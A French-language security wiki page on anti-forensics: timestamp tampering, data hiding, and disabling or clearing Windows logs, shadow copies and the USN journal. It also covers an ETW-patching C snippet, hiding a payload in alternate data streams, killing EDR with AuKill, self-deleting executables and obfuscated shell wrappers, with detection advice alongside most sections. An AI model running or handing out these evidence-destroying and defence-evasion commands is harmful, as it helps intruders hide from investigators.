# Techniques anti-forensiques

{{#include ../../banners/hacktricks-training.md}}

## Horodatages

Un attaquant peut vouloir **modifier les horodatages des fichiers** pour éviter d'être détecté.\
Les horodatages se trouvent dans la MFT, dans les attributs `$STANDARD_INFORMATION` \_\_ et \_\_ `$FILE_NAME`.

Les deux attributs contiennent 4 horodatages : **modification**, **accès**, **création** et **modification du registre MFT** (MACE ou MACB).

**L’explorateur Windows** et d’autres outils affichent les informations de **`$STANDARD_INFORMATION`**.

### TimeStomp - Outil anti-forensique

Cet outil **modifie** les horodatages dans **`$STANDARD_INFORMATION`**, **mais pas** ceux de **`$FILE_NAME`**. Il est donc possible d’**identifier** une **activité suspecte**.

### Usnjrnl

Le **journal USN** (Update Sequence Number Journal) est une fonctionnalité de NTFS (système de fichiers Windows NT) qui suit les modifications apportées au volume. L’outil [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) permet d’examiner ces modifications.

![TimeStomp - Outil anti-forensique - Usnjrnl : le journal USN (Update Sequence Number Journal) est une fonctionnalité de NTFS (système de fichiers Windows NT) qui suit les modifications apportées au volume. L’...](<../../images/image (801).png>)

L’image précédente montre la **sortie** de l’**outil**, où l’on peut constater que des **modifications ont été apportées** au fichier.

### $LogFile

**Toutes les modifications des métadonnées d’un système de fichiers sont consignées** selon un processus appelé [journalisation anticipée](https://en.wikipedia.org/wiki/Write-ahead_logging). Les métadonnées consignées sont conservées dans un fichier nommé `**$LogFile**`, situé à la racine d’un système de fichiers NTFS. Des outils tels que [LogFileParser](https://github.com/jschicht/LogFileParser) peuvent analyser ce fichier et repérer les modifications.

![Usnjrnl - $LogFile : toutes les modifications des métadonnées d’un système de fichiers sont consignées selon un processus appelé journalisation anticipée. Les métadonnées consignées sont conservées dans un fichier nommé $LogFile , situé à la racine...](<../../images/image (137).png>)

Là encore, la sortie de l’outil permet de voir que **des modifications ont été apportées**.

Avec le même outil, il est possible d’identifier **à quel moment les horodatages ont été modifiés** :

![Usnjrnl - $LogFile : avec le même outil, il est possible d’identifier à quel moment les horodatages ont été modifiés](<../../images/image (1089).png>)

- CTIME : heure de création du fichier
- ATIME : heure de modification du fichier
- MTIME : heure de modification du registre MFT du fichier
- RTIME : heure d’accès au fichier

### Comparaison de `$STANDARD_INFORMATION` et `$FILE_NAME`

Une autre manière de repérer les fichiers modifiés de façon suspecte consiste à comparer les heures des deux attributs et à rechercher des **écarts**.

### Nanosecondes

Les horodatages **NTFS** ont une **précision** de **100 nanosecondes**. Ainsi, trouver des fichiers dont les horodatages sont du type 2010-10-10 10:10:**00.000:0000 est très suspect**.

### SetMace - Outil anti-forensique

Cet outil peut modifier les deux attributs `$STARNDAR_INFORMATION` et `$FILE_NAME`. Cependant, depuis Windows Vista, il faut que le système d’exploitation soit en cours d’exécution pour modifier ces informations.

## Masquage de données

NFTS utilise des clusters et une taille minimale d’information. Cela signifie que si un fichier occupe un cluster et demi, **la moitié restante ne sera jamais utilisée** tant que le fichier n’est pas supprimé. Il est donc possible de **masquer des données dans cet espace résiduel**.

Des outils comme slacker permettent de masquer des données dans cet espace « caché ». Toutefois, une analyse de `$logfile` et `$usnjrnl` peut montrer que des données ont été ajoutées :

![SetMace - Outil anti-forensique - Masquage de données : des outils comme slacker permettent de masquer des données dans cet espace « caché ». Toutefois, une analyse de $logfile et $usnjrnl peut montrer que...](<../../images/image (1060).png>)

Il est alors possible d’extraire l’espace résiduel avec des outils comme FTK Imager. Notez que ce type d’outil peut enregistrer le contenu sous une forme obfusquée, voire chiffrée.

## UsbKill

Cet outil **éteint l’ordinateur si une modification des ports USB** est détectée.\
Pour le repérer, on peut inspecter les processus en cours d’exécution et **examiner chaque script Python actif**.

## Distributions Linux Live

Ces distributions sont **exécutées en mémoire RAM**. On ne peut les détecter que **si le système de fichiers NTFS est monté avec des droits d’écriture**. S’il est monté en lecture seule, l’intrusion ne pourra pas être détectée.

## Suppression sécurisée

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

### Auto-suppression différée sous Windows

Une image Windows en cours d’exécution peut être verrouillée tant que son processus est actif. Un processus peut confier sa suppression à un processus enfant `cmd.exe`, utiliser `choice` comme minuterie et se terminer avant que le shell n’exécute `del`. Ce délai permet au processus d’origine de libérer son handle d’image ; il est nécessaire de mettre le chemin complet entre guillemets s’il contient des espaces.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

```cmd
cmd.exe /C choice /C Y /N /D Y /T 6 ^>nul ^& Del /F /Q "<full-path-of-current-executable>"
```

Lorsque cette chaîne est fournie directement comme argument à `cmd.exe`, plutôt que saisie depuis une autre invite `cmd` interactive, utilisez `&` au lieu de `^&` et `>nul` au lieu de `^>nul`. Cela supprime l’entrée de répertoire ; ce n’est **pas un effacement sécurisé** et cela ne supprime pas les traces d’exécution, de tâches, de journal du système de fichiers ou d’autres traces forensiques. Recherchez les processus enfants `cmd.exe` de courte durée dont la ligne de commande combine `choice /T`, `Del` et le chemin de l’image du processus parent.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

## Configuration de Windows

Il est possible de désactiver plusieurs méthodes de journalisation de Windows afin de compliquer considérablement l’investigation forensique.

### Désactiver les horodatages - UserAssist

Il s’agit d’une clé de registre qui conserve les dates et heures auxquelles l’utilisateur a exécuté chaque fichier exécutable.

La désactivation de UserAssist nécessite deux étapes :

1. Définissez les deux clés de registre `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` et `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` sur zéro pour indiquer que nous voulons désactiver UserAssist.
2. Effacez les sous-arborescences du registre qui ressemblent à `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Désactiver les horodatages - Prefetch

Cette fonctionnalité enregistre des informations sur les applications exécutées afin d’améliorer les performances du système Windows. Toutefois, ces informations peuvent également être utiles dans le cadre d’investigations forensiques.

- Exécutez `regedit`
- Sélectionnez le chemin de fichier `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Cliquez avec le bouton droit sur `EnablePrefetcher` et `EnableSuperfetch`
- Sélectionnez Modifier pour chacun d’eux afin de faire passer la valeur de 1 (ou 3) à 0
- Redémarrez

### Désactiver les horodatages - Heure du dernier accès

Chaque fois qu’un dossier est ouvert depuis un volume NTFS sur un serveur Windows NT, le système **met à jour un champ d’horodatage dans chaque dossier répertorié**, appelé heure du dernier accès. Sur un volume NTFS fortement utilisé, cela peut affecter les performances.

1. Ouvrez l’Éditeur du Registre (Regedit.exe).
2. Accédez à `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Recherchez `NtfsDisableLastAccessUpdate`. Si cette entrée n’existe pas, ajoutez ce DWORD et définissez sa valeur sur 1 pour désactiver le processus.
4. Fermez l’Éditeur du Registre et redémarrez le serveur.

### Supprimer l’historique USB

Toutes les **entrées de périphériques USB** sont stockées dans le Registre Windows, sous la clé de registre **USBSTOR**, qui contient des sous-clés créées chaque fois que vous branchez un périphérique USB à votre PC ou ordinateur portable. Vous trouverez cette clé ici : H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **En la supprimant**, vous supprimerez l’historique USB.\
Vous pouvez également utiliser l’outil [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) pour vérifier que vous les avez supprimées (et pour les supprimer).

Un autre fichier qui enregistre des informations sur les périphériques USB est `setupapi.dev.log`, situé dans `C:\Windows\INF`. Il doit également être supprimé.

### Désactiver les copies Shadow

**Lister** les copies Shadow avec `vssadmin list shadowstorage`\
**Les supprimer** en exécutant `vssadmin delete shadow`

Vous pouvez également les supprimer via l’interface graphique en suivant les étapes proposées sur [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Pour désactiver les copies Shadow, suivez [les étapes indiquées ici](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows) :

1. Ouvrez le programme Services en saisissant « services » dans la zone de recherche textuelle après avoir cliqué sur le bouton Démarrer de Windows.
2. Dans la liste, recherchez « Volume Shadow Copy », sélectionnez-le, puis accédez à Propriétés en cliquant avec le bouton droit.
3. Dans la liste déroulante « Startup type », choisissez Disabled, puis confirmez la modification en cliquant sur Apply et OK.

Il est également possible de modifier dans le registre la configuration des fichiers qui seront copiés dans la copie Shadow : `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Écraser les fichiers supprimés

- Vous pouvez utiliser un **outil Windows** : `cipher /w:C`. Cette commande indique à cipher de supprimer toutes les données de l’espace disque disponible et inutilisé du lecteur C.
- Vous pouvez également utiliser des outils comme [**Eraser**](https://eraser.heidi.ie)

### Supprimer les journaux d’événements Windows

- Windows + R --> eventvwr.msc --> Développez « Windows Logs » --> Cliquez avec le bouton droit sur chaque catégorie et sélectionnez « Clear Log »
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Désactiver les journaux d’événements Windows

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Dans la section des services, désactivez le service « Windows Event Log »
- `WEvtUtil.exec clear-log` ou `WEvtUtil.exe cl`

### Désactiver $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Journalisation avancée et falsification des traces (2023-2025)

### Journalisation PowerShell ScriptBlock/Module

Les versions récentes de Windows 10/11 et de Windows Server conservent de **riches artefacts forensiques PowerShell** dans
`Microsoft-Windows-PowerShell/Operational` (événements 4104/4105/4106).  
Les attaquants peuvent les désactiver ou les effacer à la volée :

```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Remove-WinEvent               # requires admin & Win11 23H2+
```

Les défenseurs devraient surveiller les modifications apportées à ces clés de registre et la suppression à grande échelle d’événements PowerShell.

### ETW (Event Tracing for Windows) Patch

Les produits de sécurité des terminaux s’appuient fortement sur ETW. Une méthode d’évasion répandue en 2024 consiste à patcher `ntdll!EtwEventWrite`/`EtwEventWriteFull` en mémoire afin que chaque appel ETW renvoie `STATUS_SUCCESS` sans émettre l’événement :<sup>[[5]](#references)</sup>

```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
                   patch, sizeof(patch), NULL);
```

Les PoCs publics (p. ex. `EtwTiSwallow`) implémentent la même primitive en PowerShell ou en C++.  
Comme le patch est **local au processus**, les EDR exécutés dans d’autres processus peuvent ne pas le détecter.<sup>[[5]](#references)</sup>
Détection : comparer `ntdll` en mémoire à sa version sur disque, ou installer un hook avant le passage en mode utilisateur.

### Résurgence des Alternate Data Streams (ADS)

Des campagnes de malware en 2023 (p. ex. les loaders **FIN12**) ont été observées en train de dissimuler des binaires de second stade dans des ADS pour échapper aux scanners traditionnels :

```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```

Énumérez les flux avec `dir /R`, `Get-Item -Stream *` ou Sysinternals `streams64.exe`.
Copier le fichier hôte vers FAT/exFAT ou via SMB supprimera le flux caché et peut permettre
aux enquêteurs de récupérer la charge utile.

### BYOVD & « AuKill » (2023)

Bring-Your-Own-Vulnerable-Driver est désormais couramment utilisé à des fins d’**anti-forensics** dans les intrusions par ransomware.  
L’outil open source **AuKill** charge un pilote signé mais vulnérable (`procexp152.sys`) pour suspendre ou arrêter les capteurs EDR et forensic **avant le chiffrement et la destruction des logs** :<sup>[[1]](#references)</sup>

```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```

Le pilote est ensuite supprimé, ne laissant que des traces minimes.<sup>[[1]](#references)</sup>  
Mesures d’atténuation : activer la liste de blocage des pilotes vulnérables de Microsoft (HVCI/SAC) et déclencher une alerte lors de la création d’un service noyau depuis un chemin modifiable par l’utilisateur.

---

## Anti-forensique Linux : Self‑patching et Cloud C2 (2023–2025)

### Self‑patching des services compromis pour réduire la détection (Linux)
Les adversaires « self-patch » de plus en plus souvent un service juste après l’avoir exploité, afin d’empêcher sa réexploitation et de neutraliser les détections fondées sur les vulnérabilités. L’idée consiste à remplacer les composants vulnérables par les dernières versions légitimes des binaires/JAR upstream, de sorte que les scanners signalent l’hôte comme corrigé, tandis que la persistance et le C2 restent en place.<sup>[[3]](#references)</sup>

Exemple : RCE OpenWire d’Apache ActiveMQ (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Après l’exploitation, les attaquants ont récupéré des JAR légitimes depuis Maven Central (repo1.maven.org), supprimé les JAR vulnérables de l’installation d’ActiveMQ et redémarré le broker.
- Cela a corrigé la RCE initiale tout en maintenant d’autres points d’accès (cron, modifications de la configuration SSH, implants C2 distincts).

Exemple opérationnel (illustratif)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```

Conseils de forensic et de hunting
- Examinez les répertoires de services à la recherche de remplacements non planifiés de binaires/JAR :
  - Debian/Ubuntu : `dpkg -V activemq` et comparez les hachages/chemins des fichiers avec les miroirs du dépôt.
  - RHEL/CentOS : `rpm -Va 'activemq*'`
  - Recherchez les versions de JAR présentes sur le disque qui ne sont pas gérées par le gestionnaire de paquets, ou les liens symboliques modifiés en dehors du processus habituel.
- Chronologie : `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` pour corréler les ctime/mtime avec la période de compromission.
- Historique du shell/télémétrie des processus : traces de `curl`/`wget` vers `repo1.maven.org` ou d’autres CDN d’artefacts immédiatement après l’exploitation initiale.
- Gestion des changements : vérifiez qui a appliqué le « patch » et pourquoi, et pas seulement qu’une version corrigée est présente.

### C2 via un service cloud avec des jetons bearer et des stagers anti-analyse
Les techniques observées combinaient plusieurs voies de C2 à long terme et des mécanismes de dissimulation anti-analyse :<sup>[[3]](#references)</sup>
- Chargeurs ELF PyInstaller protégés par mot de passe pour compliquer le sandboxing et l’analyse statique (par exemple, PYZ chiffré, extraction temporaire sous `/_MEI*`).
  - Indicateurs : résultats de `strings` tels que `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
  - Artefacts à l’exécution : extraction vers `/tmp/_MEI*` ou vers des chemins `--runtime-tmpdir` personnalisés.
- C2 s’appuyant sur Dropbox et utilisant des jetons OAuth Bearer codés en dur
  - Indicateurs réseau : `api.dropboxapi.com` / `content.dropboxapi.com` avec `Authorization: Bearer <token>`.
  - Recherchez dans les données de proxy/NetFlow/Zeek/Suricata les connexions HTTPS sortantes vers les domaines Dropbox depuis des charges de travail serveur qui ne synchronisent normalement pas de fichiers.
- C2 parallèle/de secours via un tunnel (par exemple, Cloudflare Tunnel `cloudflared`), afin de maintenir le contrôle si un canal est bloqué.
  - IOC sur l’hôte : processus/unités `cloudflared`, configuration dans `~/.cloudflared/*.json`, connexions sortantes sur le port 443 vers les serveurs périphériques de Cloudflare.

### Persistance et « retour en arrière du renforcement de la sécurité » pour maintenir l’accès (exemples Linux)
Les attaquants associent souvent des correctifs automatiques à des voies d’accès persistantes :<sup>[[3]](#references)</sup>
- Cron/Anacron : modifications du stub `0anacron` dans chaque répertoire `/etc/cron.*/` pour une exécution périodique.
  - Recherchez :
    ```bash
    for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
    grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
    ```
- Annulation du durcissement de la configuration SSH : activation des connexions root et modification des shells par défaut des comptes à faibles privilèges.
  - Rechercher l’activation des connexions root :
    ```bash
    grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
    # flag values like "yes" or overly permissive settings
    ```
  - Rechercher les shells interactifs suspects sur les comptes système (p. ex., `games`) :
    ```bash
    awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
    ```
- Artefacts beacon aléatoires aux noms courts (8 caractères alphabétiques), déposés sur le disque et qui contactent également un C2 cloud :
  - Rechercher :
    ```bash
    find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
      -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
    ```

Les défenseurs devraient corréler ces artefacts avec l’exposition externe et les événements de mise à jour des services afin de repérer les mécanismes d’auto-remédiation anti-forensique utilisés pour dissimuler l’exploitation initiale.

## Exécution statique d’un shell embarqué

Un wrapper de script avec un interpréteur et des implémentations de commandes embarqués peut exécuter les opérations shell prises en charge dans un seul exécutable, au lieu de lancer `/bin/sh` et des processus utilitaires distincts. HimitsuShell crée un tel binaire statique basé sur musl. Contrairement aux wrappers [SHc](../../linux-hardening/processes-crontab-systemd-dbus/cron-and-systemd-timers.md), ses commandes intégrées n’ont pas besoin de démarrer le shell de l’hôte ni un processus utilitaire distinct. Les commandes non prises en charge peuvent être exécutées par le shell système.<sup>[[9]](#references)</sup>

Cela réduit la visibilité des processus shell et des processus enfants `execve`.<sup>[[9]](#references)</sup> Le processus wrapper et ses appels système restent observables via les points de trace du noyau ; il ne faut donc pas prendre au pied de la lettre l’affirmation du projet selon laquelle il serait invisible même pour le traçage du noyau.<sup>[[9]](#references)[[11]](#references)</sup>

Pour la compilation x86_64 documentée, conservez le nom `launcher.sh` pour le fichier d’entrée et copiez-le dans le conteneur avant la compilation. Le fichier de sortie est `safeLauncher` :<sup>[[9]](#references)</sup>

```bash
curl -LO https://github.com/HimitsuShell/Himitsu/releases/download/v2.1.0/himitsu_core_x86_64_linux_musl.tar.gz
docker load -i himitsu_core_x86_64_linux_musl.tar.gz
docker run --name himitsu_core -d -it himitsu_core
docker cp launcher.sh himitsu_core:/var/work/
docker exec himitsu_core /var/work/compile.sh
docker cp himitsu_core:/var/work/safeLauncher .
```

Le `compile.sh` public chiffre le script avec AES-256-CTR, chiffre la valeur d’expiration et les clés/IV intermédiaires avec AES-256-CBC, convertit les fichiers chiffrés en tableaux C avec `xxd -i`, puis les lie à `lib.bc` avec `-static -s`. La clé et l’IV de chiffrement finaux sont également intégrés : cela protège contre une extraction statique faite à la légère, mais ne constitue pas un secret impossible à récupérer.<sup>[[10]](#references)</sup>

Les passes LLVM par défaut sont `-sobf` et `-sub`. Avant la compilation, modifiez `/var/work/compile.sh` pour activer des alternatives documentées, telles que le control-flow flattening (`fla`) ou le bogus control flow (`bcf`).<sup>[[9]](#references)[[10]](#references)</sup>

Testez la compatibilité des scripts avant de vous fier à ce wrapper : le projet cible la syntaxe POSIX shell, avertit que les scripts Bash/Zsh peuvent échouer et précise que les commandes absentes de son ensemble intégré font appel au shell système.<sup>[[9]](#references)</sup>

Pour analyser un flux de contrôle aplati, consultez [contourner le control-flow flattening avec une tranche d’exécution étroite](../../reversing/reversing-tools-basic-methods/#bypass-flattened-control-flow-with-a-narrow-execution-slice).

{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Sophos X-Ops – AuKill : un pilote vulnérable militarisé pour désactiver les EDR (mars 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patcher EtwEventWrite pour la furtivité : détection et chasse aux menaces (juin 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patcher pour assurer la persistance : comment le malware Linux DripDropper se propage dans le cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – RCE Apache ActiveMQ OpenWire (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Masquer votre .NET – ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
- [6] [FortiGuard Labs – Découverte d’une variante de SectopRAT intégrée à un logiciel légitime](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [7] [Microsoft Learn – commande choice](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/choice)
- [8] [Microsoft Learn – commande del](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/del)
- [9] [README de HimitsuShell](https://github.com/HimitsuShell/HimitsuShell)
- [10] [Script de compilation de HimitsuShell](https://github.com/HimitsuShell/HimitsuShell/blob/main/inside_container/compile.sh)
- [11] [Histogrammes d’événements du noyau Linux et traçage des appels système](https://docs.kernel.org/trace/histogram.html)
